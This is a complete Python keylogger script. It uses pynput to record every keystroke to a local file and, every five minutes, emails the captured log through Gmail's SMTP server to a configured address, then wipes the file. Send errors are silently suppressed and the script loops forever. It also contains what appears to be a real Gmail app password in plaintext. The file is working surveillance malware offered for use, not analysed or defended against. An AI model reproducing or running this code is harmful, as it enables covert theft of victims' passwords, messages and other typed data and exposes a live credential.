
import os
import time
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard
from threading import Timer

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
EMAIL = "your_email@gmail.com"  # Replace with your Gmail
PASSWORD = "nrvg yhdc byyu xsca"  # Replace with your app password
SEND_INTERVAL = 300  # seconds

log = []

def send_email(log_content):
    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL
    msg['To'] = EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL, PASSWORD)
            server.send_message(msg)
    except Exception as e:
        pass  # Ignore send errors

def write_log():
    with open(LOG_FILE, "a") as f:
        f.write("".join(log))
    log.clear()

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append("[" + str(key) + "]")

def periodic_send():
    if log:
        write_log()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            content = f.read()
        if content:
            send_email(content)
            open(LOG_FILE, "w").close()  # Clear log file after sending
    Timer(SEND_INTERVAL, periodic_send).start()

listener = keyboard.Listener(on_press=on_press)
listener.start()
periodic_send()

# Keep the script running
while True:
    time.sleep(10)
